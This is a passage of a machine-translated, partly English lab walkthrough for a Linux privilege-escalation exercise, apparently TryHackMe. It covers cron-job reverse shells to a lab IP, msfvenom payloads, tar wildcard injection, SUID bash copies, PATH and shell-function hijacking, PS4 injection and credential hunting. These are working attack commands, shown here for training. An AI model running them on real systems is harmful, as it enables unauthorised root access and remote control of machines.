data-original-src="https://miro.medium.com/v2/resize:fit:1058/format:webp/1*rcRZ7r5Ud0hSIYR4djTeaQ.png"/></div></figure><p id="739b" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">基本上，这些程序运行一个对<code class="fe mp mq mr ms b">/bin/bash</code>的系统调用来产生一个shell，因为我们用sudo运行它，我们得到一个根shell</p><p id="3447" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">这就是为什么进程独立于被调用的库</p><h1 id="8cba" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务8: Cron作业-文件权限</h1><p id="7de6" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">所以我们看到<code class="fe mp mq mr ms b">overwrite.sh</code>每分钟都被执行</p><p id="2b0c" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">哦，顺便说一下，如果你在阅读cron工作时间方面有困难，请访问<a class="ae kv" href="https://crontab.guru" rel="noopener ugc nofollow" target="_blank"> crontab guru </a></p><p id="584e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">所以现在，我们可以通过在<code class="fe mp mq mr ms b">overwrite.sh</code>中编写我们的代码来连接到我们的本地机器，生成一个shell，当它被root用户执行时，我们将得到一个shell</p><p id="9c68" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在unix系统中，打开端口(或套接字？不确定)，是通过像访问文件一样访问<code class="fe mp mq mr ms b">/dev/</code>中的协议和端口来完成的(如果我是对的，它被称为文件描述符)</p><p id="f0c3" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">所以，我们的代码应该是</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="3cc7" class="nf lt iq ms b gy ng nh l ni nj">#!/bin/bash<br/>bash -i &gt;&amp; /dev/tcp/10.2.12.26/4444 0&gt;&amp;1</span></pre><p id="8b37" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">说明:</strong></p><ul class=""><li id="4bf9" class="nr ns iq ky b kz la lc ld lf nt lj nu ln nv lr nw nx ny nz bi translated">第一行:shebang表示解释器，这里是bash</li><li id="a996" class="nr ns iq ky b kz oa lc ob lf oc lj od ln oe lr nw nx ny nz bi translated">第二行:<code class="fe mp mq mr ms b">bash -i</code>打开一个交互式shell，<code class="fe mp mq mr ms b">&gt;&amp; /dev/tcp/10.2.12.26/4444</code>将所有流重定向到我们的本地机器，<code class="fe mp mq mr ms b">0&gt;&amp;1</code>将<strong class="ky ir"> stdin </strong>和<strong class="ky ir"> stdout </strong>重定向到<strong class="ky ir"> stdout </strong></li></ul><p id="6227" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">因此，在编辑了<code class="fe mp mq mr ms b">overwrite.sh</code>中的代码之后，我们在本地机器上监听，等待一个shell</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ov"><img src="../Images/ba40fa04009957ca1331b07c75eba875.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XOERvzWEzNKbeQH9IPL-yQ.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi ow"><img src="../Images/dd88424c947fc7af78a5062cc0bb4c62.png" data-original-src="https://miro.medium.com/v2/resize:fit:1232/format:webp/1*eDIToZ3fowX55nAoffNOBA.png"/></div></figure><h1 id="9165" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务9: Cron作业路径环境变量</h1><p id="48cd" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">查看系统范围的crontab的内容:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="fa2a" class="nf lt iq ms b gy ng nh l ni nj">cat /etc/crontab</span></pre><p id="4f3d" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">注意，PATH变量以/home/user开始，这是我们用户的主目录。</p><p id="bfe5" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在您的主目录中创建一个名为overwrite.sh的文件，包含以下内容:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="5be2" class="nf lt iq ms b gy ng nh l ni nj">#!/bin/bash</span><span id="928c" class="nf lt iq ms b gy ox nh l ni nj">cp /bin/bash /tmp/rootbash<br/>chmod +xs /tmp/rootbash</span></pre><p id="3477" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">确保该文件是可执行的:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="df07" class="nf lt iq ms b gy ng nh l ni nj">chmod +x /home/user/overwrite.sh</span></pre><p id="46db" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">等待cron作业运行(不应超过一分钟)。使用-p运行/tmp/rootbash命令，获得以root权限运行的shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="5cdf" class="nf lt iq ms b gy ng nh l ni nj">/tmp/rootbash -p</span></pre><p id="0b70" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在继续之前，请记住删除修改后的代码，删除/tmp/rootbash可执行文件并退出提升的shell，因为您稍后将在房间中再次创建该文件！</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="2bab" class="nf lt iq ms b gy ng nh l ni nj">rm /tmp/rootbash<br/>exit</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oy"><img src="../Images/4636b7c3610e5e606eaad377b3358e1d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jgPMnL1u6Mb3J7HYQH1GLA.png"/></div></div></figure><h1 id="5c0f" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务10: Cron作业-通配符</h1><p id="7bee" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">查看其他cron作业脚本的内容:</p><p id="dc73" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">cat /usr/local/bin/compress.sh</code></p><p id="a9c7" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">请注意，tar命令是在您的主目录中使用通配符(*)运行的。</p><p id="7e50" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">请看一下<a class="ae kv" href="https://gtfobins.github.io/gtfobins/tar/" rel="noopener ugc nofollow" target="_blank"> tar </a>的GTFOBins页面。注意，tar有命令行选项，允许您运行其他命令作为检查点特性的一部分。</p><p id="5224" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在你的Kali box上使用msfvenom生成一个反向shell ELF二进制。相应地更新LHOST IP地址:</p><p id="3d59" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf</code></p><p id="7e51" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">将shell.elf文件传输到Debian VM上的<strong class="ky ir"> /home/user/ </strong>(您可以使用<strong class="ky ir"> scp </strong>或将文件托管在Kali box上的web服务器上，并使用<strong class="ky ir"> wget </strong>)。确保文件是可执行的:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi oz"><img src="../Images/8320a03e1abb48e4ed33d3d7002fce1c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*oDaffa8ZIA6P8VSZi0ul_A.png"/></div></div></figure><p id="fab9" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">chmod +x /home/user/shell.elf</code></p><p id="26c0" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在/home/user中创建这两个文件:</p><p id="9ec1" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">touch /home/user/--checkpoint=1<br/>touch /home/user/--checkpoint-action=exec=shell.elf</code></p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pa"><img src="../Images/a8fd9d50b66b5408ee07fb8dfb0997de.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bzKa899oggi7jd7AiKqrCA.png"/></div></div></figure><p id="7941" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">当cron作业中的tar命令运行时，通配符(*)将扩展到包括这些文件。因为它们的文件名是有效的tar命令行选项，tar会识别它们，并把它们当作命令行选项而不是文件名。</p><p id="f871" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在Kali box的4444端口上设置一个netcat监听器，并等待cron作业运行(不应该超过一分钟)。根shell应该连接回您的netcat监听器。</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pb"><img src="../Images/5a7ee616e75dd19abfc36c96a9885fd4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1276/format:webp/1*f0bmOcBz8r8HQjjHW18WlA.png"/></div></figure><p id="e9b9" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">nc -nvlp 4444</code></p><p id="9ad4" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">记得退出根shell并删除您创建的所有文件，以防止cron作业再次执行:</strong></p><p id="4398" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">rm /home/user/shell.elf<br/>rm /home/user/--checkpoint=1<br/>rm /home/user/--checkpoint-action=exec=shell.elf</code></p><h1 id="cf54" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务11: SUID / SGID可执行文件-已知漏洞</h1><p id="c011" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">在Debian虚拟机上找到所有的SUID/SGID可执行文件:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="996d" class="nf lt iq ms b gy ng nh l ni nj">find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2&gt; /dev/null</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pc"><img src="../Images/48cb6f3c09d3be18da844f65b3fe90db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*e14EM0OxcnpnZt2MvnFFfg.png"/></div></div></figure><p id="3a7c" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">请注意,/ usr/sbin/exim-4.84–3出现在结果中。尝试查找此版本exim的已知漏洞。Exploit-DB、Google和GitHub是搜索的好地方！</p><p id="3be2" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">应该可以利用与此版本的exim完全匹配的本地权限提升漏洞。可以在Debian VM的/home/user/tools/suid/exim/CVE-2016–1531 . sh上找到一份副本。</p><p id="d105" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">运行漏洞脚本以获得根外壳:</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pd"><img src="../Images/62681c2b73cce6608fdd9eb966c7c271.png" data-original-src="https://miro.medium.com/v2/resize:fit:1300/format:webp/1*G5gpeoi32OW8DOT6yfpqZA.png"/></div></figure><h1 id="ecd3" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务12: SUID / SGID可执行文件-共享对象注入</h1><p id="0b8d" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">当我们运行<code class="fe mp mq mr ms b">/usr/local/bin/suid-so</code>(与共享对象有关的东西)时，它显示一个进度条，然后退出</p><p id="8131" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">所以我们运行一个<code class="fe mp mq mr ms b">strace /usr/local/bin/suid-so 2&gt;&amp;1 | grep -iE "open|access|no such file"</code>,看看是否有错误的配置或文件，我们可以改变来利用这个可执行文件。</p><p id="0a2e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">从输出来看，我们的目标是<code class="fe mp mq mr ms b">/home/user/.config/libcalc.so</code>,因为它不存在，我们有管理文件和文件夹的读写权限</p><p id="2d49" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在编译和运行漏洞时，我们获得了根外壳访问权限</p><p id="60c1" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">注意，可执行文件试图加载/home/user/。config/libcalc.so共享对象，但是找不到它。</p><p id="0bd6" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">创建。libcalc.so文件的配置目录:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="4c58" class="nf lt iq ms b gy ng nh l ni nj">mkdir /home/user/.config</span></pre><p id="bbc1" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">示例共享对象代码可以在/home/user/tools/suid/lib calc . c中找到。在suid-so可执行文件查找代码的位置，将代码编译成共享对象:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="5719" class="nf lt iq ms b gy ng nh l ni nj">gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c</span></pre><p id="6ab5" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">再次执行suid-so可执行文件，注意这一次，我们得到的不是进度条，而是根shell。</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="153d" class="nf lt iq ms b gy ng nh l ni nj">/usr/local/bin/suid-so</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pe"><img src="../Images/5cd6ab1c9a8dce0faac3fc104218d600.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*pO15IpFtoYow__3XKrURlA.png"/></div></div></figure><h1 id="c984" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务13: SUID / SGID可执行文件-环境变量</h1><p id="83c2" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">由于/usr/local/bin/suid-env可执行文件继承了用户的PATH环境变量，并试图在不指定绝对路径的情况下执行程序，因此可以利用该文件。</p><p id="59fa" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">首先，执行该文件，注意它似乎试图启动apache2服务器:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="5d1b" class="nf lt iq ms b gy ng nh l ni nj">/usr/local/bin/suid-env</span></pre><p id="7196" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在文件上运行字符串以查找可打印的字符串:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="58d1" class="nf lt iq ms b gy ng nh l ni nj">strings /usr/local/bin/suid-env</span></pre><p id="e889" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">其中一行(“service apache2 start”)表示正在调用服务可执行文件来启动web服务器，但是没有使用可执行文件的完整路径(/usr/sbin/service)。</p><p id="45bd" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">将位于/home/user/tools/suid/service . c的代码编译成一个名为service的可执行文件。这段代码只是生成了一个Bash shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="31f7" class="nf lt iq ms b gy ng nh l ni nj">gcc -o service /home/user/tools/suid/service.c</span></pre><p id="4583" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">将当前目录(或新服务可执行文件所在的位置)添加到PATH变量前面，并运行suid-env可执行文件以获得根shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="89c9" class="nf lt iq ms b gy ng nh l ni nj">PATH=.:$PATH /usr/local/bin/suid-env</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pf"><img src="../Images/b9e50af45278eee965eac578d34bdc81.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0jHiSN82EqN-AQKzpHexQg.png"/></div></div></figure><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pg"><img src="../Images/846d2322f7ed829039956743cfdf2120.png" data-original-src="https://miro.medium.com/v2/resize:fit:1348/format:webp/1*I5gBfvDHbbIbzUNktm1PSg.png"/></div></figure><h1 id="62c2" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务14: SUID / SGID可执行文件-滥用外壳功能(#1)</h1><p id="3c5d" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">这非常有趣。所以在低于4.2–048的bash版本中，我们可以定义类似文件路径的函数</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi ph"><img src="../Images/fe93b9c4bf06337450f7376104defa74.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*4d9oCJzSCXiPGZuAeV2J5g.png"/></div></div></figure><p id="6f5e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">/usr/local/bin/suid-env2可执行文件与/usr/local/bin/suid-env相同，只是它使用服务可执行文件的绝对路径(/usr/sbin/service)来启动apache2服务器。</p><p id="7f1f" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">用字符串验证这一点:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="5cec" class="nf lt iq ms b gy ng nh l ni nj">strings /usr/local/bin/suid-env2</span></pre><p id="f179" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在Bash版本中&lt;4.2–048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.</p><p id="d6f9" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">Verify the version of Bash installed on the Debian VM is less than 4.2–048:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="8c47" class="nf lt iq ms b gy ng nh l ni nj">/bin/bash --version</span></pre><p id="4dbe" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">Create a Bash function with the name “/usr/sbin/service” that executes a new Bash shell (using -p so permissions are preserved) and export the function:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="13ce" class="nf lt iq ms b gy ng nh l ni nj">function /usr/sbin/service { /bin/bash -p; }<br/>export -f /usr/sbin/service</span></pre><p id="cf2e" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">Run the suid-env2 executable to gain a root shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="9d16" class="nf lt iq ms b gy ng nh l ni nj">/usr/local/bin/suid-env2</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/b0ba84495d8b06d17ba005beb23349ad.png" data-original-src="https://miro.medium.com/v2/resize:fit:1342/format:webp/1*XuuEfTZd7_P8v6ETaUN9vA.png"/></div></figure><h1 id="6ff2" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">Task 15: SUID / SGID Executables -Abusing Shell Features (#2)</h1><p id="f087" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">so, in bash versions less than 4.4 and above, we could define the PS4 variable to display an extra prompt for debugging statements in debugging mode.</p><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div role="button" tabindex="0" class="kl km di kn bf ko"><div class="gh gi pj"><img src="../Images/07f847c0637013cef8274160969fa306.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BKH0hcfIXH1GQnpPWQlecQ.png"/></div></div></figure><p id="5e91" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><em class="mx">注意:这在Bash版本4.4和更高版本上不起作用。</em></p><p id="9f55" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在调试模式下，Bash使用环境变量<strong class="ky ir"> PS4 </strong>来显示调试语句的额外提示。</p><p id="4b53" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">运行<strong class="ky ir"> /usr/local/bin/suid-env2 </strong>可执行文件，启用bash调试，并将PS4变量设置为一个嵌入式命令，这将创建/bin/bash的suid版本:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="be2a" class="nf lt iq ms b gy ng nh l ni nj">env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2</span></pre><p id="6ff5" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用-p运行/tmp/rootbash可执行文件，以获得使用root权限运行的shell:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="8eb3" class="nf lt iq ms b gy ng nh l ni nj">/tmp/rootbash -p</span></pre><p id="7e1c" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">记得在继续之前删除/tmp/rootbash可执行文件并退出提升的shell，因为稍后您将在房间中再次创建该文件！</strong></p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="520d" class="nf lt iq ms b gy ng nh l ni nj">rm /tmp/rootbash<br/>exit</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pk"><img src="../Images/335c0fd13709e8c9649087ee67b6fdc9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1350/format:webp/1*m4brJHNOi3zL53l-jYtV7A.png"/></div></figure><h1 id="8035" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务16:密码和密钥-历史文件</h1><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pl"><img src="../Images/89705d22a946ab62350ae220017a0f5d.png" data-original-src="https://miro.medium.com/v2/resize:fit:964/format:webp/1*7B3Ql8agAxg3YAQZd7oAJQ.png"/></div></figure><p id="8f54" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">使用密码切换到root用户:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="baea" class="nf lt iq ms b gy ng nh l ni nj">su root</span></pre><h1 id="e1ea" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务17:密码和密钥-配置文件</h1><p id="b962" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">配置文件通常包含明文或其他可逆格式的密码。</p><p id="38e0" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">列出用户主目录的内容:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="9d10" class="nf lt iq ms b gy ng nh l ni nj">ls /home/user</span></pre><p id="3d5f" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">请注意myvpn.ovpn配置文件的存在。查看文件的内容:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="a360" class="nf lt iq ms b gy ng nh l ni nj">cat /home/user/myvpn.ovpn</span></pre><p id="99b6" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">该文件应该包含对可以找到root用户凭据的另一个位置的引用。使用凭据切换到root用户:</p><pre class="kg kh ki kj gt nb ms nc nd aw ne bi"><span id="fae2" class="nf lt iq ms b gy ng nh l ni nj">su root</span></pre><figure class="kg kh ki kj gt kk gh gi paragraph-image"><div class="gh gi pm"><img src="../Images/e76b57908277b7115a24eb0961361d90.png" data-original-src="https://miro.medium.com/v2/resize:fit:1024/format:webp/1*6RbD5TzZORM-vQ9BM4WLNA.png"/></div></figure><p id="7417" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><strong class="ky ir">问题1: </strong>您在哪个文件中找到了root用户的凭证？</p><blockquote class="mu mv mw"><p id="8c4c" class="kw kx mx ky b kz la jr lb lc ld ju le my lg lh li mz lk ll lm na lo lp lq lr ij bi translated"><strong class="ky ir"> <em class="iq">答案:/etc/openvpn/auth.txt </em> </strong></p></blockquote><h1 id="bbc3" class="ls lt iq bd lu lv lw lx ly lz ma mb mc jw md jx me jz mf ka mg kc mh kd mi mj bi translated">任务18:密码和密钥-SSH密钥</h1><p id="5374" class="pw-post-body-paragraph kw kx iq ky b kz mk jr lb lc ml ju le lf mm lh li lj mn ll lm ln mo lp lq lr ij bi translated">有时，用户会备份重要文件，但却无法使用正确的权限来保护它们。</p><p id="7909" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">在系统根目录中查找隐藏的文件和目录:</p><p id="1b49" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated"><code class="fe mp mq mr ms b">ls -la /</code></p><p id="4133" class="pw-post-body-paragraph kw kx iq ky b kz la jr lb lc ld ju le lf lg lh li lj lk ll lm ln lo lp lq lr ij bi translated">请注意，似乎有一个名为<strong 